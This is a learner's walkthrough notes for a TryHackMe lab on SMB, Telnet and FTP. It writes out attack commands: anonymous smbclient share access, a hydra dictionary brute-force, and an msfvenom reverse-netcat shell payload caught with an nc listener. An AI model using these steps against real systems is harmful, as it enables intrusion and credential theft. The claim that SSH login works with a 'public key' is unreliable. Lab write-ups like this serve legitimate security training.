# Network Services I 

#### Connecting to THM's OpenVPN Server
- To actually do this room and other rooms in the future, [connect to THM](https://tryhackme.com/access) by using OpenVPN
- First, install OpenVPN by following instructions based on your OS
- Next, download your configuration file from this [link](https://tryhackme.com/access)
- Then, use this config and import it to OpenVPN
- Finally, connect and ignore the details in the site as they are bugged, test connection with `ping 10.10.10.10`
- This allows you to SSH into THM's machines

#### Server Message Block Protocol or SMB
- Client-server communication protocol used for sharing access to files, printers, serial ports, and other resources on a network
- Servers make file systems and other resources available to clients on the network
- It is known as a response-request protocol, so it passes messages back and forth between client and server to establish a connection
    - Clients connect to servers via TCP/IP (NetBIOS over TCP/IP as specified in RFC1001 and RFC1002), NetBEUI, or IPX/SPX
- Once a connection has been established, clients can send SMB commands to the server to access shares, open files, read, and write files and do all the things you need with a file system over the network
- Microsoft Windows has included client and server SMB support since Windows 95
- UNIX uses Samba which is an open source server that supports SMB

#### Enumerating SMB
- Enumeration is basically gathering information on a target in order to find potential attack vectors
    - Enumeration can be used to gather everything from usernames, passwords, network info, host names, application data, services, etc...
    - Usually, servers have SMB share drives for file transfer and viewing, so attackers can easily exploit it to gather sensitive files or information
- Port Scanning
    - This is usually the first step of enumeration
    - Finding out everything you can about services, applications, structure, and operating system of target machine
    - Nmap is a great tool for port scanning
- Enum4Linux
    - A great tool for enumerating SMB shares on both Windows and Linux
    - Basically, a wrapper around the tools in Samba and makes it easy to extract SMB information about the target
    - Syntax is `enum4linux <options> <ip>`
        - Options
        1. `-U` - get user list
        2. `-M` - get machine list
        3. `-N` - get name list dump
        4. `-S` - get share list
        5. `-P` - get password policy information
        6. `-G` - get group and member list
        7. `-a` - get all of the above (full enumeration)

#### Exploiting SMB
- Types of SMB Exploits
    - CVE-2017-7494 shows that remote code execution can be used once SMB has been exploited
    - The best and most likely way of getting into a system is thanks to a misconfiguration within the system
    - Anonymous SMB share access can have a misconfiguration allowing us to gain information that would lead to the shell
- Method Breakdown
    - We have
    1. SMB share location
    2. The name of an interesting SMB share
    - We can use
    1. SMBClient
        - Because we're trying to access an SMB share, we need a client to access resources on servers
        - SMBClient is part of the default samba suite, great because the target OS is Linux-based
        - Syntax: `smbclient //<IP>/<Share Name> -U <Name of User> -p <Port>`
            - The default port for SMB is 445
- Experience
    - This was my first real THM Attackbox experience and it was pretty hard having no experience with SMBClient
    - First, I used `nmap -sS` to scan for open ports on the target's network; we found that SMB is open on 139 and 445 (default)
    - Next, I fully enumerated the SMB using the given IP address and enum4linux of the target which I got the OS, shares of interest, and workgroup name from
    - Then, in order to get into profiles, I used SMBClient with the username anonymous, the default port, and no password `smbclient //10.10.212.98/profiles -U Anonymous -p 445`; using `more` to open the .txt file, we learned that this user was given ssh access and his name is John Cactus
    - Finally, I `ls` the directory and learn that there is a .ssh directory which contains an RSA public key; we `get` this and `ssh cactus@10.10.212.98 -i <public key>` to get into the system as the user using his public key
    - Most of these syntax were obfuscated from the room, but it wasn't so bad in the end

#### Telnet
- Telnet is an application protocol that uses a telnet client to allow you to connect and execute commands on a remote machine that's running a Telnet server
    - The client establishes a connection with the server which becomes a virtual terminal, allowing you to interact with the remote host
- SSH has mostly replaced Telnet because Telnet only sends cleartext messages, which is unsecure (unencrypted)
- Syntax: `telnet <IP> <Port>

#### Enumerating Telnet
- To enumerate Telnet, we first use `nmap` much like we did for SMB
- First, I scanned the IP of the target using a bunch of `nmap` options, but none of these worked
    - I used the following options:
    1. `-p-` - Scan all ports
    2. `-vv` - Verbose (extended)
    3. `-T5` - Fast mode
    - I determined that the port 8012/tcp was open
- `-p-` is key here because sometimes, non-standard ports are used as a way to hide services
- Now that I've determined an exact port, I can aggressively scan the port with a new option: `-A`
    - `-A` enables OS detection, version detection, script scanning, and traceroute
    - I use the command `nmap <IP> -p 8012 -A -vv`
    - I notice something of interest: "SKIDY'S BACKDOOR"
- Finally, I have enumerated three new things:
    - An open port: 8012
    - A possible username: "SKIDY"
    - The purpose of the port: Backdoor

#### Exploiting Telnet
- As a protocol, Telnet is pretty unsecure because it doesn't encrypt its messages
- There are Common Vulnerabilities and Exposures or CVEs for Telnet client and server systems in [MITRE](https://cve.mitre.org/) and [CVE Details](https://www.cvedetails.com/)
    - A CVE is a list of publicly disclosed security flaws
- Method Breakdown
    - We have
    1. A poorly hidden telnet service
    2. The service is a backdoor
    3. Possibly a username "Skidy"
    - We can use
    1. A Telnet connection
       - `telnet <IP> <Port>`
    2. Reverse Shell
       - A shell is a piece of code which can be used to gain code or command execution on a device
       - A reverse shell is a shell where the target machine communicates back to the attacking machine
       - The attacking machine has a listening port which receives the comms from the target machine
- Experience
    - After enumerating, I ran `telnet <IP> <port>` which brought me to a server that welcomed me with "SKIDY'S BACKDOOR"
        - The server doesn't seem to output anything for any command
        - I use `.HELP` which shows me that there are only two commands: `.RUN <command>` and `.EXIT`
    - I need a tcpdump listener in order to receive ICMP traffic to see if I can ping from the telnet server to my machine
        - A tcpdump listener is created locally with `sudo tcpdump ip proto \\icmp -i tun0`
        - Next, I tested ping on the Telnet server with `.RUN ping <IP> -c 1`
        - I receive a response/request log in the tcpdump listener, there is a connection and we can execute commands
    - Next, create a reverse shell payload using `msfvenom` in the local machine, not in the Telnet server or tcpdump listener
        - Syntax: `msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=4444 R`
            - Options:
            1. `-p`: payload
            2. `lhost`: the IP of the local machine
            3. `lport`: the port to listen on
            4. `R`: export in a raw format
    - Finally, set up a netcat listener in the local machine    
        - Syntax: `nc -lvnp <Port>`
        - Copy the generated payload and `.RUN` it on the Telnet server
        - Now, we have a shell on the target machine and we can run commands
        - Run `ls` and find "flags.txt" `cat flags.txt` and that's the flag

#### File Transfer Protocol or FTP
- A protocol used to remotely transfer files over a network
- Uses a client-server model
    - Client initiates a connection with the server
    - Server validates login credentials and opens the session
- Relays commands and data very efficiently
- Operates using two channels:
1. Command and Control (C2) Channel - command transmission
2. Data Channel - data transfer
- Active FTP Connection - Client opens a port and listens, server is required to actively connect to it
- Passive FTP Connection - Server opens a port and listens passively, client connects to it
- Separation of command and data into separate channels allows you to send commands without having to wait for data transfer to finish, thereby being very efficient
- The standard port is 21 for command and 20 for data

#### Enumerating FTP
- Exploit an anonymous FTP login to see what files we can access
- See if we can pop a shell on the system with these files
- Common in CTF challenges and mimics real-life careless FTP server implementation
- Again, our tool to scan for all ports is `nmap <IP> -p- -vv -T5`, so start with that
    - We find that port 21 is open which is the standard port for FTP
- Now, we want to aggressively scour that port using the `-A` option
    - We find out that the variant or version of FTP is vsftpd
    - Let's login to the FTP server of the IP using anonymous for our username
- Great, now we're in the FTP server and we can do `ls` to check for files in our current directory
    - We find `PUBLIC_NOTICE.txt`
    - Open that with `more`
    - The notice seems to be written by Mike, this could be a username!
- We have gathered FTP version, open ports, and a possible username

#### Exploiting FTP
- Just like Telnet, FTP's command and data channels are unencrypted
- MitM attacks can easily intercept and steal important commands and data
- We can exploit weak or default password configurations in FTP servers
- Method Breakdown
    - We have
    1. Unsecure ports (20/21)
    2. Possible username
    3. FTP Version
    - We can use
    1. Hydra
        - Hydra is a very fast online password cracking tool which can perform rapid dictionary brute-force attacks
        - Works for more than 50 protocols (SSH, FTP, HTTP/S, SMB, etc...)
        - Syntax: `hydra -t <# of parallel connections> -l <username> -P <dictionary path> -vV <IP> <protocol>`
    2. FTP
        - `ftp <IP>`
- Experience
    - After enumerating, I learned what the username of the target was, so all I need now is the password.
        - In order to get the password, I used Hydra: `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <IP> ftp`
        - This didn't work initially as rockyou.txt was actually in a `.gzip` file
        - I unzipped it with `gzip -d /usr/share/wordlists/rockyou.txt.gz`, but you can also use `gunzip`
        - Hydra ran for a bit and landed on the matching password "password"
    - Now, I simply connect to the FTP server and use mike's credentials
        - `ftp <IP>`
    - I `ls` and find the flag and use `more` to view it

#### Summary 
- Enumerating and exploiting Telnet involved a lot of connecting and setting up.  The main takeaway from enumeration is that sometimes services are hidden by using non-standard ports. A lot of setting up was done for exploitation: connection to a telnet server, tcpdump listener, netcat listener, and a reverse shell payload. Basically: connect to telnet, ping to check connection, create a listener, generate payload, push and run payload, and then execute commands remotely.
- This was definitely my favorite room so far. I learned a ton of new practical methods as well as three new network protocols that I can exploit confidently. I learned enumeration via port scanning using nmap as well as SMB enumeration using enum4linux. All in all, I learned the following tools: nmap, enum4linux, smbclient, telnet, tcpdump, msfvenom, netcat or nc, and hydra. Great room overall.